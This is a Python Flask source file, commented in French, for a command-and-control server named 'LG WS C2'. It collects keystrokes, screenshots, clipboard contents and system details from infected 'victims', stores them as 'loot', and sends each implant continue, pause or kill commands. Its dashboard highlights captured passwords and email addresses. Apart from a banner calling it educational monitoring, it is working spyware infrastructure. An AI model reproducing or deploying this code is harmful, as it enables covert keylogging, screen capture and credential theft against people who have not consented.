import os
import base64
import json
import re
from flask import Flask, request, jsonify, render_template_string, redirect, url_for, send_from_directory
from datetime import datetime

app = Flask(__name__)

# --- CONFIGURATION AUTOMATIQUE ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'loot')

# Dictionnaire pour stocker les commandes individuelles par UUID
# Structure : { 'uuid-123': 'stop', 'uuid-456': 'continue' }
VICTIM_COMMANDS = {}
GLOBAL_DEFAULT = "continue"

if not os.path.exists(UPLOAD_FOLDER):
    try:
        os.makedirs(UPLOAD_FOLDER)
    except Exception: pass

# --- DASHBOARD SOC EDITION ---
HTML_DASHBOARD = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <title>LG WS C2 - SOC Edition</title>
    <meta charset="utf-8">
    <style>
        /* BASE & THEME */
        body { font-family: 'Segoe UI', 'Roboto', monospace; background: #0d1117; color: #c9d1d9; margin: 0; padding: 0; }
        .container { max-width: 1800px; margin: 0 auto; padding: 20px; }
        
        /* BANNIERE */
        .edu-banner {
            background: repeating-linear-gradient(45deg, #1f1f1f, #1f1f1f 10px, #2d2d2d 10px, #2d2d2d 20px);
            color: #ff4757; text-align: center; padding: 5px; font-size: 0.8em; border-bottom: 2px solid #ff4757; font-weight: bold;
        }

        /* HEADER */
        .header-panel {
            display: flex; justify-content: space-between; align-items: center;
            background: #161b22; border: 1px solid #30363d; padding: 20px; border-radius: 8px; margin-bottom: 20px;
        }
        h1 { margin: 0; font-size: 1.5em; color: #58a6ff; display: flex; align-items: center; }
        .badge { background: #238636; color: white; padding: 2px 8px; border-radius: 10px; font-size: 0.5em; vertical-align: middle; margin-left: 10px;}

        /* STATS PANEL */
        .stats-bar { display: flex; gap: 20px; margin-bottom: 20px; }
        .stat-card { background: #161b22; padding: 15px; border-radius: 6px; border: 1px solid #30363d; flex: 1; text-align: center; }
        .stat-val { font-size: 1.8em; font-weight: bold; color: #fff; }
        .stat-label { font-size: 0.8em; color: #8b949e; text-transform: uppercase; }

        /* GRID VICTIMES */
        #victim-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(450px, 1fr)); gap: 20px; }

        .victim-card { 
            background: #161b22; border: 1px solid #30363d; border-radius: 6px; 
            padding: 0; overflow: hidden; position: relative; transition: transform 0.2s;
        }
        .victim-card:hover { border-color: #58a6ff; transform: translateY(-2px); }
        
        .card-header { 
            padding: 15px; background: #21262d; border-bottom: 1px solid #30363d; 
            display: flex; justify-content: space-between; align-items: center;
        }
        .ip-addr { color: #fff; font-weight: bold; font-size: 1.1em; font-family: monospace; }
        .uuid-small { font-size: 0.7em; color: #8b949e; display: block; }
        
        .status-dot { height: 10px; width: 10px; background-color: #bbb; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .status-online { background-color: #238636; box-shadow: 0 0 8px #238636; animation: pulse 2s infinite; }
        .status-paused { background-color: #d29922; }
        .status-killed { background-color: #da3633; }

        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }

        /* ACTIONS INDIVIDUELLES */
        .card-actions { padding: 10px 15px; display: flex; gap: 5px; background: #0d1117; border-bottom: 1px solid #30363d;}
        .mini-btn { 
            border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 0.75em; 
            font-weight: bold; color: #fff; opacity: 0.7; transition: 0.2s;
        }
        .mini-btn:hover { opacity: 1; }
        .btn-c-stop { background: #d29922; }
        .btn-c-cont { background: #238636; }
        .btn-c-kill { background: #da3633; }
        
        .tabs { display: flex; border-bottom: 1px solid #30363d; }
        .tab-btn { flex: 1; background: none; border: none; color: #8b949e; padding: 10px; cursor: pointer; font-size: 0.8em; }
        .tab-btn:hover { color: #58a6ff; background: #21262d; }

        /* LOGS & HIGHLIGHTING */
        .log-area { 
            height: 250px; overflow-y: scroll; background: #000; color: #3fb950; 
            padding: 10px; font-family: 'Consolas', monospace; font-size: 0.85em; 
            white-space: pre-wrap; border-top: 1px solid #30363d;
        }
        
        /* C'est ici la magie du DLP (Data Loss Prevention) */
        .highlight-pass { color: #ff7b72; font-weight: bold; background: rgba(255, 123, 114, 0.1); }
        .highlight-email { color: #79c0ff; text-decoration: underline; }
        .highlight-clip { color: #d29922; font-weight: bold; border: 1px dashed #d29922; display: block; margin: 5px 0; padding: 2px;}

        /* MODALE GALERIE */
        .modal { display: none; position: fixed; z-index: 999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); }
        .modal-content { margin: 5% auto; width: 80%; max-height: 80vh; overflow-y: auto; background: #161b22; padding: 20px; border-radius: 8px; border: 1px solid #30363d; }
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 10px; }
        .gallery-img { width: 100%; border-radius: 4px; border: 1px solid #30363d; transition: 0.2s; cursor: pointer; }
        .gallery-img:hover { transform: scale(2); border-color: #fff; z-index: 100; position: relative; }
    </style>
</head>
<body>
    <div class="edu-banner">SYSTEME DE MONITORING PEDAGOGIQUE - ACCES AUTORISÉ UNIQUEMENT</div>

    <div class="container">
        <div class="header-panel">
            <h1>LG WS C2 <span class="badge">ULTIMATE v3</span></h1>
            <div>
                <span style="font-size:0.8em; color:#888; margin-right:10px;">COMMANDE GLOBALE D'URGENCE:</span>
                <button onclick="globalCmd('continue')" class="mini-btn btn-c-cont">TOUT ACTIVER</button>
                <button onclick="globalCmd('stop')" class="mini-btn btn-c-stop">TOUT PAUSE</button>
            </div>
        </div>

        <div class="stats-bar">
            <div class="stat-card">
                <div class="stat-val" id="total-victims">0</div>
                <div class="stat-label">Agents Détectés</div>
            </div>
            <div class="stat-card">
                <div class="stat-val" id="active-victims" style="color:#238636">0</div>
                <div class="stat-label">Actifs (Live)</div>
            </div>
            <div class="stat-card">
                <div class="stat-val" id="total-files">0</div>
                <div class="stat-label">Fichiers Exfiltrés</div>
            </div>
        </div>

        <div id="victim-list"></div>
    </div>

    <div id="galleryModal" class="modal" onclick="this.style.display='none'">
        <div class="modal-content" onclick="event.stopPropagation()">
            <h2 style="color:white; border-bottom:1px solid #333; padding-bottom:10px;">Preuves Visuelles</h2>
            <div id="galleryBody" class="gallery-grid"></div>
        </div>
    </div>

    <script>
        // --- CORE LOGIC ---
        
        // Fonction pour surligner les données sensibles (DLP)
        function syntaxHighlight(text) {
            if (!text) return "";
            // Passwords / Mots de passe
            text = text.replace(/(password|mdp|pass|mot de passe|login)/gi, '<span class="highlight-pass">$1</span>');
            // Emails
            text = text.replace(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi, '<span class="highlight-email">$1</span>');
            // Presse Papier (défini par notre format --- [CLIPBOARD] ---)
            text = text.replace(/--- \[CLIPBOARD (.*?)\] ---/g, '<span class="highlight-clip">📋 PRESSE-PAPIER ($1) :</span>');
            return text;
        }

        function updateDashboard() {
            fetch('/api/dashboard_data')
            .then(res => res.json())
            .then(data => {
                // Update Stats
                document.getElementById('total-victims').innerText = data.stats.total;
                document.getElementById('active-victims').innerText = data.stats.active;
                document.getElementById('total-files').innerText = data.stats.files;

                // Update Cards
                const container = document.getElementById('victim-list');
                
                // Pour chaque victime reçue
                data.victims.forEach(v => {
                    let card = document.getElementById('card-' + v.uuid);
                    
                    // Déterminer la couleur du statut
                    let statusClass = 'status-online';
                    let statusText = 'LIVE';
                    if (v.last_cmd === 'stop') { statusClass = 'status-paused'; statusText = 'PAUSE'; }
                    if (v.last_cmd === 'kill') { statusClass = 'status-killed'; statusText = 'TERMINE'; }

                    if (!card) {
                        // CRÉATION DE LA CARTE SI INEXISTANTE
                        let html = `
                        <div id="card-${v.uuid}" class="victim-card">
                            <div class="card-header">
                                <div>
                                    <span class="status-dot ${statusClass}" id="dot-${v.uuid}"></span>
                                    <span class="ip-addr">${v.ip}</span>
                                    <span class="uuid-small">${v.uuid}</span>
                                </div>
                                <div style="text-align:right">
                                    <small style="color:#888">${v.os}</small><br>
                                    <strong id="status-text-${v.uuid}" style="font-size:0.8em; color:#888">${statusText}</strong>
                                </div>
                            </div>
                            
                            <div class="card-actions">
                                <button onclick="setCmd('${v.uuid}', 'continue')" class="mini-btn btn-c-cont">REC</button>
                                <button onclick="setCmd('${v.uuid}', 'stop')" class="mini-btn btn-c-stop">PAUSE</button>
                                <button onclick="setCmd('${v.uuid}', 'kill')" class="mini-btn btn-c-kill">KILL</button>
                                <div style="flex-grow:1"></div>
                                <button onclick="openGallery('${v.uuid}')" class="mini-btn" style="background:#6f42c1">GALERIE</button>
                            </div>

                            <div class="log-area" id="logs-${v.uuid}"></div>
                        </div>`;
                        container.insertAdjacentHTML('beforeend', html);
                        
                        // Lancer le polling de logs spécifique pour cette carte
                        startLogPolling(v.uuid);
                    } else {
                        // MISE A JOUR SIMPLE (Statut)
                        document.getElementById('dot-'+v.uuid).className = 'status-dot ' + statusClass;
                        document.getElementById('status-text-'+v.uuid).innerText = statusText;
                    }
                });
            });
        }

        // Récupération des logs avec Highlighting
        function startLogPolling(uuid) {
            setInterval(() => {
                fetch('/api/logs/' + uuid)
                .then(res => res.json())
                .then(data => {
                    let div = document.getElementById('logs-' + uuid);
                    // On ne met à jour que si le contenu change (longueur)
                    if (div.getAttribute('data-len') != data.content.length) {
                        div.innerHTML = syntaxHighlight(data.content);
                        div.scrollTop = div.scrollHeight;
                        div.setAttribute('data-len', data.content.length);
                    }
                });
            }, 2000);
        }

        // Commandes API
        function setCmd(uuid, cmd) {
            fetch('/api/set_cmd/' + uuid + '/' + cmd).then(() => updateDashboard());
        }
        function globalCmd(cmd) {
            fetch('/set_global/' + cmd).then(() => updateDashboard());
        }

        // Galerie
        function openGallery(uuid) {
            fetch('/api/gallery/' + uuid)
            .then(res => res.json())
            .then(imgs => {
                let html = "";
                if (imgs.length === 0) html = "<p style='color:white; text-align:center'>Aucune image.</p>";
                imgs.forEach(img => {
                    html += `<img src="/loot_file/${uuid}/${img}" class="gallery-img">`;
                });
                document.getElementById('galleryBody').innerHTML = html;
                document.getElementById('galleryModal').style.display = 'block';
            });
        }

        // Main Loop
        setInterval(updateDashboard, 2000);
        updateDashboard();

    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_DASHBOARD)

# --- API ENDPOINTS ---

@app.route('/api/dashboard_data')
def api_dashboard():
    victims = []
    file_count = 0
    active_count = 0
    
    if os.path.exists(UPLOAD_FOLDER):
        uuids = [d for d in os.listdir(UPLOAD_FOLDER) if os.path.isdir(os.path.join(UPLOAD_FOLDER, d))]
        for uuid in uuids:
            path = os.path.join(UPLOAD_FOLDER, uuid)
            
            # Infos système
            info = {}
            try:
                with open(os.path.join(path, 'info.json'), 'r') as f: info = json.load(f)
            except: pass
            
            # Statut commande
            cmd = VICTIM_COMMANDS.get(uuid, GLOBAL_DEFAULT)
            if cmd == 'continue': active_count += 1

            # Compter fichiers
            try: file_count += len(os.listdir(path))
            except: pass

            victims.append({
                "uuid": uuid,
                "ip": info.get('ip_address', 'Unknown'),
                "os": info.get('os', 'Unknown'),
                "last_cmd": cmd
            })

    return jsonify({
        "stats": { "total": len(victims), "active": active_count, "files": file_count },
        "victims": victims
    })

@app.route('/api/set_cmd/<uuid>/<cmd>')
def api_set_cmd(uuid, cmd):
    if cmd in ['continue', 'stop', 'kill']:
        VICTIM_COMMANDS[uuid] = cmd
    return jsonify({"status": "ok"})

@app.route('/set_global/<cmd>')
def api_set_global(cmd):
    global GLOBAL_DEFAULT
    GLOBAL_DEFAULT = cmd
    # On reset les commandes individuelles pour suivre le global
    VICTIM_COMMANDS.clear() 
    return jsonify({"status": "ok"})

@app.route('/api/data', methods=['POST'])
def receive_data():
    try:
        content = request.json
        uuid = content.get('uuid', 'unknown')
        folder = os.path.join(UPLOAD_FOLDER, uuid)
        if not os.path.exists(folder): os.makedirs(folder)

        # 1. Sauvegarde info.json
        if content.get('system_info'):
            with open(os.path.join(folder, 'info.json'), 'w') as f:
                json.dump(content.get('system_info'), f)

        # 2. Sauvegarde Logs
        if content.get('keystrokes'):
            with open(os.path.join(folder, 'keylog.txt'), 'a', encoding='utf-8') as f:
                f.write(content['keystrokes'])

        # 3. Sauvegarde Screenshot
        if content.get('screenshot'):
            try:
                data = base64.b64decode(content['screenshot'])
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                with open(os.path.join(folder, f"screen_{ts}.jpg"), 'wb') as f: f.write(data)
            except: pass

        # 4. Réponse intelligente (Commande spécifique ou globale)
        response_cmd = VICTIM_COMMANDS.get(uuid, GLOBAL_DEFAULT)
        
        return jsonify({"status": "ok", "command": response_cmd})
    except: return jsonify({"status": "err"}), 500

# Helpers
@app.route('/api/logs/<uuid>')
def get_logs(uuid):
    try:
        with open(os.path.join(UPLOAD_FOLDER, uuid, 'keylog.txt'), 'r', encoding='utf-8') as f:
            return jsonify({"content": f.read()})
    except: return jsonify({"content": ""})

@app.route('/api/gallery/<uuid>')
def get_gallery(uuid):
    try:
        imgs = sorted([f for f in os.listdir(os.path.join(UPLOAD_FOLDER, uuid)) if f.endswith('.jpg')], reverse=True)
        return jsonify(imgs)
    except: return jsonify([])

@app.route('/loot_file/<uuid>/<filename>')
def serve_file(uuid, filename):
    return send_from_directory(os.path.join(UPLOAD_FOLDER, uuid), filename)

if __name__ == '__main__':
    print(f"=== LG WS C2 ULTIME DÉMARRÉ SUR {UPLOAD_FOLDER} ===")
    app.run(host='0.0.0.0', port=5000)
